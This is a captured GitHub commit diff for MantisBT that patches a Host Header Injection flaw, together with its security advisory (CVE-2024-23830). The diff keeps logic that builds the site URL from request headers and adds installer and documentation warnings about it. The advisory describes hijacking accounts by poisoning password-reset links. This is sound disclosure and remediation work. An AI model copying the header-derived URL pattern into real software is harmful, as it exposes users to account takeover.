|  |  | const HOST\_HEADER\_INJECTION\_URL = 'https://owasp.org/www-project-web-security-testing-guide/stable/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/17-Testing\_for\_Host\_Header\_Injection'; |
|  |  | check\_print\_test\_warn\_row( |
|  |  | '"path" is defined in config\_inc.php.', |
|  |  | !$g\_defaulted\_path, |
|  |  | array( false => |
|  |  | 'Leaving it empty is a security risk, as the path will be set based on ' |
|  |  | . 'headers from the HTTP request, exposing your system to ' |
|  |  | . '<a href="' . HOST\_HEADER\_INJECTION\_URL . '">Host Header Injection attacks</a>.' |
|  |  | ) |
|  |  | ); |
|  |  |  |
|  |  | $t\_path\_config\_names = array( |
|  |  | 'absolute\_path', |
|  |  | 'core\_path', |
| Expand Down | |  |

66 changes: 64 additions & 2 deletions

66
[admin/install.php](#diff-458b194824e77773f4bf1441ec318c127ba9786a1651e80011c8a69c8e817072 "admin/install.php")

Show comments

[View file](/mantisbt/mantisbt/blob/7055731d09ff12b2781410a372f790172e279744/admin/install.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -240,6 +240,7 @@ function\_exists( 'mysqli\_stmt\_get\_result' ), |
|  |  | $f\_db\_username = config\_get\_global( 'db\_username', '' ); |
|  |  | $f\_db\_password = config\_get\_global( 'db\_password', '' ); |
|  |  | $f\_timezone = config\_get( 'default\_timezone', '' ); |
|  |  | $f\_path = config\_get\_global( 'path', '' ); |
|  |  |  |
|  |  | # Set default prefix/suffix form variables ($f\_db\_table\_XXX) |
|  |  | $t\_prefix\_type = 'other'; |
| Expand All | | @@ -258,6 +259,7 @@ function\_exists( 'mysqli\_stmt\_get\_result' ), |
|  |  | $f\_db\_password = config\_get\_global( 'db\_password' ); |
|  |  | } |
|  |  | $f\_timezone = gpc\_get( 'timezone', config\_get( 'default\_timezone' ) ); |
|  |  | $f\_path = gpc\_get( 'path', config\_get\_global( 'path', '' ) ); |
|  |  |  |
|  |  | # Set default prefix/suffix form variables ($f\_db\_table\_XXX) |
|  |  | $t\_prefix\_type = $f\_db\_type == 'oci8' ? $f\_db\_type : 'other'; |
| Expand Down  Expand Up | | @@ -471,6 +473,40 @@ function\_exists( 'mysqli\_stmt\_get\_result' ), |
|  |  | } |
|  |  | ?> |
|  |  | </tr> |
|  |  | <tr> |
|  |  | <td> |
|  |  | Checking URL to installation |
|  |  | </td> |
|  |  | <?php |
|  |  | $t\_url\_check = ''; |
|  |  | if( !$f\_path ) { |
|  |  | # Empty URL - warn admin about security risk |
|  |  | $t\_url\_check = "Using an empty path is a security risk, as MantisBT " |
|  |  | . "will dynamically set it based on headers from the HTTP request, " |
|  |  | . "exposing your system to Host Header Injection attacks."; |
|  |  | $t\_hard\_fail = false; |
|  |  | } else { |
|  |  | # Make sure we have a trailing '/' |
|  |  | $f\_path = rtrim( $f\_path, '/' ) . '/'; |
|  |  |  |
|  |  | # Check that the URL is valid |
|  |  | if( !filter\_var( $f\_path, FILTER\_VALIDATE\_URL ) ) { |
|  |  | $t\_url\_check = "'$f\_path' is not a valid URL."; |
|  |  | } else { |
|  |  | require\_api( 'url\_api.php' ); |
|  |  | $t\_page\_contents = url\_get( $f\_path ); |
|  |  | if( !$t\_page\_contents ) { |
|  |  | $t\_url\_check = "Can't retrieve web page at '$f\_path'."; |
|  |  | } elseif( false === strpos( $t\_page\_contents, 'MantisBT') ) { |
|  |  | $t\_url\_check = "Web page at '$f\_path' does not appear to be a MantisBT site."; |
|  |  | } |
|  |  | } |
|  |  | $t\_hard\_fail = true; |
|  |  | } |
|  |  |  |
|  |  | print\_test\_result( $t\_url\_check ? BAD : GOOD, $t\_hard\_fail, $t\_url\_check ); |
|  |  | ?> |
|  |  | </tr> |
|  |  | <?php |
|  |  | if( $f\_db\_exists ) { |
|  |  | ?> |
| Expand Down  Expand Up | | @@ -724,13 +760,13 @@ function\_exists( 'mysqli\_stmt\_get\_result' ), |
|  |  | echo "\t</td>\n\t<td>\n\t\t"; |
|  |  | $t\_required = $t\_key == 'db\_table\_plugin\_prefix' ? 'required' : ''; |
|  |  | /\*\* @noinspection HtmlUnknownAttribute \*/ |
|  |  | printf( '<input id="%1$s" name="%1$s" type="text" class="table-prefix" %2$s value="%3$s">', |
|  |  | printf( '<input id="%1$s" name="%1$s" type="text" class="table-prefix reset" %2$s value="%3$s">', |
|  |  | $t\_key, |
|  |  | $t\_key == 'db\_table\_plugin\_prefix' ? 'required' : '', |
|  |  | ${'f\_' . $t\_key} // The actual value of the corresponding form variable |
|  |  | ); |
|  |  | echo "\n&nbsp;"; |
|  |  | printf( '<button id="%s" type="button" class="btn btn-sm btn-primary btn-white btn-round reset-prefix">%s</button>', |
|  |  | printf( '<button id="%s" type="button" class="btn btn-sm btn-primary btn-white btn-round reset">%s</button>', |
|  |  | "btn\_$t\_key", |
|  |  | lang\_get( 'reset' ) |
|  |  | ); |
| Expand Down  Expand Up | | @@ -765,6 +801,27 @@ function\_exists( 'mysqli\_stmt\_get\_result' ), |
|  |  | </select> |
|  |  | </td> |
|  |  | </tr> |
|  |  |  |
|  |  | <!-- URL to installation ($g\_path) --> |
|  |  | <tr> |
|  |  | <td> |
|  |  | <label for="path">URL to your installation (<em>$g\_path</em>, see |
|  |  | <a href="https://mantisbt.org/docs/master/en-US/Admin\_Guide/html-desktop/#admin.config.path" |
|  |  | target="\_blank">documentation</a>) |
|  |  | </label> |
|  |  | </td> |
|  |  | <td> |
|  |  | <input id="path" name="path" type="text" size="50" class="reset" |
|  |  | value="<?php echo string\_attribute( $f\_path ) ?>" |
|  |  | data-defval="<?php global $g\_path; echo string\_attribute( $g\_path ); ?>" |
|  |  | /> |
|  |  |  |
|  |  | <button id="btn\_path" type="button" class="btn btn-sm btn-primary btn-white btn-round reset"> |
|  |  | <?php echo lang\_get( 'reset' ); ?> |
|  |  | </button> |
|  |  | </td> |
|  |  | </tr> |
|  |  |  |
|  |  | <?php |
|  |  | } # end install-only fields |
|  |  | ?> |
| Expand Down  Expand Up | | @@ -1324,6 +1381,11 @@ function\_exists( 'mysqli\_stmt\_get\_result' ), |
|  |  | . (!$t\_crypto\_master\_salt ? "# The installer could not generate the Master Salt; please set it manually.\n" : '') |
|  |  | . "\$g\_crypto\_master\_salt = '" . addslashes( $t\_crypto\_master\_salt ) . "';" . PHP\_EOL; |
|  |  |  |
|  |  | if( $f\_path ) { |
|  |  | $t\_config .= PHP\_EOL |
|  |  | . "\$g\_path = '" . addslashes( $f\_path ) . "';" . PHP\_EOL; |
|  |  | } |
|  |  |  |
|  |  | $t\_write\_failed = true; |
|  |  |  |
|  |  | if( !$t\_config\_exists ) { |
| Expand Down | |  |

95 changes: 21 additions & 74 deletions

95
[config\_defaults\_inc.php](#diff-e0260ebe7f7f5577fe56696994618dcb3096a6e3c43f05623dd0894dac6b7a7c "config_defaults_inc.php")

Show comments

[View file](/mantisbt/mantisbt/blob/7055731d09ff12b2781410a372f790172e279744/config_defaults_inc.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -194,83 +194,34 @@ |
|  |  | # MantisBT Path Settings # |
|  |  | ########################## |
|  |  |  |
|  |  | $t\_protocol = 'http'; |
|  |  | $t\_host = 'localhost'; |
|  |  | if( isset ( $\_SERVER['SCRIPT\_NAME'] ) ) { |
|  |  | $t\_protocol = http\_is\_protocol\_https() ? 'https' : 'http'; |
|  |  |  |
|  |  | # $\_SERVER['SERVER\_PORT'] is not defined in case of php-cgi.exe |
|  |  | if( isset( $\_SERVER['SERVER\_PORT'] ) ) { |
|  |  | $t\_port = ':' . $\_SERVER['SERVER\_PORT']; |
|  |  | if( ( ':80' == $t\_port && 'http' == $t\_protocol ) |
|  |  | || ( ':443' == $t\_port && 'https' == $t\_protocol )) { |
|  |  | $t\_port = ''; |
|  |  | } |
|  |  | } else { |
|  |  | $t\_port = ''; |
|  |  | } |
|  |  |  |
|  |  | if( isset( $\_SERVER['HTTP\_X\_FORWARDED\_HOST'] ) ) { # Support ProxyPass |
|  |  | $t\_hosts = explode( ',', $\_SERVER['HTTP\_X\_FORWARDED\_HOST'] ); |
|  |  | $t\_host = $t\_hosts[0]; |
|  |  | } else if( isset( $\_SERVER['HTTP\_HOST'] ) ) { |
|  |  | $t\_host = $\_SERVER['HTTP\_HOST']; |
|  |  | } else if( isset( $\_SERVER['SERVER\_NAME'] ) ) { |
|  |  | $t\_host = $\_SERVER['SERVER\_NAME'] . $t\_port; |
|  |  | } else if( isset( $\_SERVER['SERVER\_ADDR'] ) ) { |
|  |  | $t\_host = $\_SERVER['SERVER\_ADDR'] . $t\_port; |
|  |  | } |
|  |  |  |
|  |  | if( !isset( $\_SERVER['SCRIPT\_NAME'] )) { |
|  |  | echo 'Invalid server configuration detected. Please set $g\_path manually in ' . $g\_config\_path . 'config\_inc.php.'; |
|  |  | if( isset( $\_SERVER['SERVER\_SOFTWARE'] ) && ( stripos($\_SERVER['SERVER\_SOFTWARE'], 'nginx') !== false ) ) |
|  |  | echo ' Please try to add "fastcgi\_param SCRIPT\_NAME $fastcgi\_script\_name;" to the nginx server configuration.'; |
|  |  | die; |
|  |  | } |
|  |  |  |
|  |  | # Prevent XSS if the path is displayed later on. This is the equivalent of |
|  |  | # FILTER\_SANITIZE\_STRING, which was deprecated in PHP 8.1: |
|  |  | # strip tags and null bytes, then encode quotes into HTML entities |
|  |  | $t\_path = preg\_replace( '/\x00|<[^>]\*>?/', '', $\_SERVER['SCRIPT\_NAME'] ); |
|  |  | $t\_path = str\_replace( ["'", '"'], ['&#39;', '&#34;'], $t\_path ); |
|  |  |  |
|  |  | $t\_path = dirname( $t\_path ); |
|  |  | switch( basename( $t\_path ) ) { |
|  |  | case 'admin': |
|  |  | $t\_path = dirname( $t\_path ); |
|  |  | break; |
|  |  | case 'check': # admin checks dir |
|  |  | case 'soap': |
|  |  | case 'rest': |
|  |  | $t\_path = dirname( $t\_path, 2 ); |
|  |  | break; |
|  |  | case 'swagger': |
|  |  | $t\_path = dirname( $t\_path, 3 ); |
|  |  | break; |
|  |  | } |
|  |  | $t\_path = rtrim( $t\_path, '/\\' ) . '/'; |
|  |  |  |
|  |  | if( strpos( $t\_path, '&#' ) ) { |
|  |  | echo 'Can not safely determine $g\_path. Please set $g\_path manually in ' . $g\_config\_path . 'config\_inc.php'; |
|  |  | die; |
|  |  | } |
|  |  | } else { |
|  |  | $t\_path = 'mantisbt/'; |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Path to your installation as seen from the web browser |
|  |  | \* requires trailing / |
|  |  | \* Full URL to your installation as seen from the web browser. |
|  |  | \* |
|  |  | \* Requires trailing `/`. |
|  |  | \* |
|  |  | \* If not set, MantisBT will default this to a working URL valid for most |
|  |  | \* installations. |
|  |  | \* |
|  |  | \* WARNING: The default is built based on headers from the HTTP request |
|  |  | \* ({@see set\_default\_path()} in core.php). This is a potential security risk, |
|  |  | \* as the system will be exposed to Host Header injection attacks, so it is |
|  |  | \* strongly recommended to initialize this in config\_inc.php. |
|  |  | \* |
|  |  | \* @global string $g\_path |
|  |  | \*/ |
|  |  | $g\_path = $t\_protocol . '://' . $t\_host . $t\_path; |
|  |  | $g\_path = ''; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Short web path without the domain name |
|  |  | \* requires trailing / |
|  |  | \* Short web path without the domain name. |
|  |  | \* |
|  |  | \* requires trailing `/`. |
|  |  | \* |
|  |  | \* This is defined by MantisBT core based on the script being executed, and |
|  |  | \* should not be set in config\_inc.php. |
|  |  | \* |
|  |  | \* @global string $g\_short\_path |
|  |  | \*/ |
|  |  | $g\_short\_path = $t\_path; |
|  |  | $g\_short\_path = ''; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Used to link to manual for User Documentation. |
| Expand Down  Expand Up | | @@ -5052,10 +5003,6 @@ |
|  |  | 'wrap\_in\_preformatted\_text' |
|  |  | ); |
|  |  |  |
|  |  | # Temporary variables should not remain defined in global scope |
|  |  | unset( $t\_protocol, $t\_host, $t\_hosts, $t\_port, $t\_self, $t\_path ); |
|  |  |  |
|  |  |  |
|  |  | ############################ |
|  |  | # Webservice Configuration # |
|  |  | ############################ |
| Expand Down | |  |

90 changes: 89 additions & 1 deletion

90
[core.php](#diff-12c64b5df81f5ee6cf28ade08b1cb9e33d1e43339aa7c2aba61128d1bb57c83a "core.php")

Show comments

[View file](/mantisbt/mantisbt/blob/7055731d09ff12b2781410a372f790172e279744/core.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -99,11 +99,16 @@ |
|  |  |  |
|  |  | # config\_inc may not be present if this is a new install |
|  |  | $t\_config\_inc\_found = file\_exists( $g\_config\_path . 'config\_inc.php' ); |
|  |  |  |
|  |  | if( $t\_config\_inc\_found ) { |
|  |  | require\_once( $g\_config\_path . 'config\_inc.php' ); |
|  |  | } |
|  |  |  |
|  |  | # Set global path variables |
|  |  | # NOTE: We store whether $g\_path was defaulted, so we can later warn the admin |
|  |  | # about the exposure to host header injection attacks if they didn't set it. |
|  |  | global $g\_defaulted\_path; |
|  |  | $g\_defaulted\_path = set\_default\_path(); |
|  |  |  |
|  |  | # Ensure PHP LDAP extension is available when Login Method is LDAP |
|  |  | global $g\_login\_method; |
|  |  | if ( $g\_login\_method == LDAP ) { |
| Expand Down  Expand Up | | @@ -306,6 +311,89 @@ function http\_is\_protocol\_https() { |
|  |  | return false; |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Set Global Path variables. |
|  |  | \* |
|  |  | \* @see $g\_path |
|  |  | \* @see $g\_short\_path |
|  |  | \* |
|  |  | \* @return bool True if default $g\_path was assigned, false if it was already set. |
|  |  | \*/ |
|  |  | function set\_default\_path() { |
|  |  | global $g\_path, $g\_short\_path, $g\_config\_path; |
|  |  |  |
|  |  | # $g\_path is set in config\_inc.php |
|  |  | if( $g\_path ) { |
|  |  | # Derive $g\_short\_path from $g\_path if not set |
|  |  | if( !$g\_short\_path ) { |
|  |  | $g\_short\_path = parse\_url( $g\_path, PHP\_URL\_PATH ); |
|  |  | } |
|  |  | return false; |
|  |  | } |
|  |  |  |
|  |  | $t\_protocol = 'http'; |
|  |  | $t\_host = 'localhost'; |
|  |  | if( isset( $\_SERVER['SCRIPT\_NAME'] ) ) { |
|  |  | $t\_protocol = http\_is\_protocol\_https() ? 'https' : 'http'; |
|  |  |  |
|  |  | # $\_SERVER['SERVER\_PORT'] is not defined in case of php-cgi.exe |
|  |  | if( isset( $\_SERVER['SERVER\_PORT'] ) ) { |
|  |  | $t\_port = ':' . $\_SERVER['SERVER\_PORT']; |
|  |  | if( ( ':80' == $t\_port && 'http' == $t\_protocol ) |
|  |  | || ( ':443' == $t\_port && 'https' == $t\_protocol )) { |
|  |  | $t\_port = ''; |
|  |  | } |
|  |  | } else { |
|  |  | $t\_port = ''; |
|  |  | } |
|  |  |  |
|  |  | if( isset( $\_SERVER['HTTP\_X\_FORWARDED\_HOST'] ) ) { # Support ProxyPass |
|  |  | $t\_hosts = explode( ',', $\_SERVER['HTTP\_X\_FORWARDED\_HOST'] ); |
|  |  | $t\_host = $t\_hosts[0]; |
|  |  | } else if( isset( $\_SERVER['HTTP\_HOST'] ) ) { |
|  |  | $t\_host = $\_SERVER['HTTP\_HOST']; |
|  |  | } else if( isset( $\_SERVER['SERVER\_NAME'] ) ) { |
|  |  | $t\_host = $\_SERVER['SERVER\_NAME'] . $t\_port; |
|  |  | } else if( isset( $\_SERVER['SERVER\_ADDR'] ) ) { |
|  |  | $t\_host = $\_SERVER['SERVER\_ADDR'] . $t\_port; |
|  |  | } |
|  |  |  |
|  |  | # Prevent XSS if the path is displayed later on. This is the equivalent of |
|  |  | # FILTER\_SANITIZE\_STRING, which was deprecated in PHP 8.1: |
|  |  | # strip tags and null bytes, then encode quotes into HTML entities |
|  |  | $t\_path = preg\_replace( '/\x00|<[^>]\*>?/', '', $\_SERVER['SCRIPT\_NAME'] ); |
|  |  | $t\_path = str\_replace( ["'", '"'], ['&#39;', '&#34;'], $t\_path ); |
|  |  |  |
|  |  | $t\_path = dirname( $t\_path ); |
|  |  | switch( basename( $t\_path ) ) { |
|  |  | case 'admin': |
|  |  | $t\_path = dirname( $t\_path ); |
|  |  | break; |
|  |  | case 'check': # admin checks dir |
|  |  | case 'soap': |
|  |  | case 'rest': |
|  |  | $t\_path = dirname( $t\_path, 2 ); |
|  |  | break; |
|  |  | case 'swagger': |
|  |  | $t\_path = dirname( $t\_path, 3 ); |
|  |  | break; |
|  |  | } |
|  |  | $t\_path = rtrim( $t\_path, '/\\' ) . '/'; |
|  |  |  |
|  |  | if( strpos( $t\_path, '&#' ) ) { |
|  |  | echo 'Can not safely determine $g\_path. Please set $g\_path manually in ' . $g\_config\_path . 'config\_inc.php'; |
|  |  | die; |
|  |  | } |
|  |  | } else { |
|  |  | $t\_path = 'mantisbt/'; |
|  |  | } |
|  |  |  |
|  |  | $g\_path = $t\_protocol . '://' . $t\_host . $t\_path; |
|  |  | $g\_short\_path = $t\_path; |
|  |  |  |
|  |  | return true; |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Define an autoload function to automatically load classes when referenced |
|  |  | \* |
| Expand Down | |  |

28 changes: 22 additions & 6 deletions

28
[docbook/Admin\_Guide/en-US/config/path.xml](#diff-d49c654dbd12929170cdf2fe3a25d32ec3afaddc84881aade49fe8a4ed8ff8d2 "docbook/Admin_Guide/en-US/config/path.xml")

Show comments

[View file](/mantisbt/mantisbt/blob/7055731d09ff12b2781410a372f790172e279744/docbook/Admin_Guide/en-US/config/path.xml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -13,13 +13,29 @@ |
|  |  | <varlistentry> |
|  |  | <term>$g\_path</term> |
|  |  | <listitem> |
|  |  | <para>URL to your installation as seen from the web browser; this |
|  |  | is what you type into the URL field. Requires trailing '/' |
|  |  | character. eg. 'https://www.example.com/mantisbt/'. MantisBT will default this to |
|  |  | the correct value. However, in some cases it might be necessary to |
|  |  | override the default. This is typically needed when an installation can be |
|  |  | accessed by multiple URLs (internal vs external). |
|  |  | <para> |
|  |  | Full URL to your installation as seen from the web browser. |
|  |  | </para> |
|  |  | <para> |
|  |  | This is what users type into the URL field, e.g. |
|  |  | <literal>https://www.example.com/mantisbt/</literal>. |
|  |  | Requires trailing `/`. |
|  |  | </para> |
|  |  | <para> |
|  |  | If not set, MantisBT will default this to a working URL valid |
|  |  | for most installations. However, in some cases (typically when |
|  |  | an installation can be accessed by multiple URLs, e.g. internal |
|  |  | vs external), it might be necessary to override the default. |
|  |  | </para> |
|  |  | <warning><para> |
|  |  | The default is built based on headers from the HTTP request. |
|  |  | This is a potential security risk, as the system will be exposed to |
|  |  | <ulink url="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web\_Application\_Security\_Testing/07-Input\_Validation\_Testing/17-Testing\_for\_Host\_Header\_Injection" |
|  |  | >Host Header injection</ulink> |
|  |  | attacks, so it is |
|  |  | strongly recommended to initialize this in config\_inc.php. |
|  |  | </para> |
|  |  | </warning> |
|  |  | </listitem> |
|  |  | </varlistentry> |
|  |  | <varlistentry> |
| Expand Down | |  |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `7055731`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fcommit%2F7055731d09ff12b2781410a372f790172e279744) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_6e009d9b_20250111_190659.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fsecurity%2Fadvisories%2FGHSA-mcqj-7p29-9528)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmantisbt%2Fmantisbt%2Fsecurity%2Fadvisories%2FGHSA-mcqj-7p29-9528)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=mantisbt%2Fmantisbt)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mantisbt](/mantisbt)
/
**[mantisbt](/mantisbt/mantisbt)**
Public

* [Notifications](/login?return_to=%2Fmantisbt%2Fmantisbt) You must be signed in to change notification settings
* [Fork
  728](/login?return_to=%2Fmantisbt%2Fmantisbt)
* [Star
   1.7k](/login?return_to=%2Fmantisbt%2Fmantisbt)

* [Code](/mantisbt/mantisbt)
* [Pull requests
  75](/mantisbt/mantisbt/pulls)
* [Actions](/mantisbt/mantisbt/actions)
* [Security](/mantisbt/mantisbt/security)
* [Insights](/mantisbt/mantisbt/pulse)

Additional navigation options

* [Code](/mantisbt/mantisbt)
* [Pull requests](/mantisbt/mantisbt/pulls)
* [Actions](/mantisbt/mantisbt/actions)
* [Security](/mantisbt/mantisbt/security)
* [Insights](/mantisbt/mantisbt/pulse)

# MantisBT Host Header Injection vulnerability

High

[dregad](/dregad)
published
GHSA-mcqj-7p29-9528
Feb 20, 2024

## Package

composer

mantisbt
([Composer](/advisories?query=ecosystem%3Acomposer))

## Affected versions

<2.26.1

## Patched versions

2.26.1

## Description

### Impact

Knowing a user's email address and username, an unauthenticated attacker can hijack the user's account by poisoning the link in the password reset notification message.

### Patches

[7055731](https://github.com/mantisbt/mantisbt/commit/7055731d09ff12b2781410a372f790172e279744)

### Workarounds

Define `$g_path` as appropriate in config\_inc.php.

### References

<https://mantisbt.org/bugs/view.php?id=19381>

### Credits

Thanks to the following security researchers for responsibly reporting and helping resolve this vulnerability.

* Pier-Luc Maltais (<https://twitter.com/plmaltais>)
* Hlib Yavorskyi (<https://github.com/Kerkroups>)
* Jingshao Chen (<https://github.com/shaozi>)
* Brandon Roldan
* nhchoudhary

### Severity

High

8.3

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
Required

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
Low

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L

### CVE ID

CVE-2024-23830

### Weaknesses

No CWEs

### Credits

* [![@dregad](https://avatars.githubusercontent.com/u/449891?s=40&v=4)](/dregad)
  [dregad](/dregad)
  Remediation developer
* [![@Kerkroups](https://avatars.githubusercontent.com/u/40368700?s=40&v=4)](/Kerkroups)
  [Kerkroups](/Kerkroups)
  Finder
* [![@shaozi](https://avatars.githubusercontent.com/u/417833?s=40&v=4)](/shaozi)
  [shaozi](/shaozi)
  Finder
* [![@plmaltais](https://avatars.githubusercontent.com/u/4512311?s=40&v=4)](/plmaltais)
  [plmaltais](/plmaltais)
  Finder
* [![@atrol](https://avatars.githubusercontent.com/u/319317?s=40&v=4)](/atrol)
  [atrol](/atrol)
  Remediation reviewer

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


